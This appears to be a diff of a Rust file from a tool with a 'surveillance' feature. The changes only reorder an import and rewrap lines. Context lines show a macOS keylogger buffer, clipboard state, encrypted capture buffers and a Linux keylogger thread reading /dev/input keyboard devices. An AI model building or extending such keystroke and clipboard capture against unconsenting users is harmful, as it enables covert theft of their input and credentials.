@@ -21,10 +21,10 @@
 
 #![cfg(feature = "surveillance")]
 
-use common::lock::MutexExt;
 use anyhow::{anyhow, Result};
 use chacha20poly1305::aead::{Aead, KeyInit};
 use chacha20poly1305::{ChaCha20Poly1305, Nonce};
+use common::lock::MutexExt;
 use once_cell::sync::Lazy;
 #[cfg(target_os = "macos")]
 use std::ffi::c_void;
@@ -289,7 +289,8 @@ static CLIPBOARD_STATE: Lazy<Arc<Mutex<Option<ClipboardState>>>> =
     Lazy::new(|| Arc::new(Mutex::new(None)));
 
 #[cfg(target_os = "macos")]
-static MAC_KEYLOGGER_BUFFER: Lazy<Mutex<Option<Arc<Mutex<EncryptedBuffer>>>>> = Lazy::new(|| Mutex::new(None));
+static MAC_KEYLOGGER_BUFFER: Lazy<Mutex<Option<Arc<Mutex<EncryptedBuffer>>>>> =
+    Lazy::new(|| Mutex::new(None));
 
 #[cfg(target_os = "macos")]
 static MAC_KEYLOGGER_ACTIVE: AtomicBool = AtomicBool::new(false);
@@ -876,7 +877,9 @@ fn start_keylogger_thread_linux(
         // 1. Enumerate keyboard devices from /dev/input/eventX
         let devices = enumerate_evdev_keyboards();
         if devices.is_empty() {
-            tracing::error!("surveillance: no keyboard evdev devices found (need root or input group)");
+            tracing::error!(
+                "surveillance: no keyboard evdev devices found (need root or input group)"
+            );
             return;
         }
 
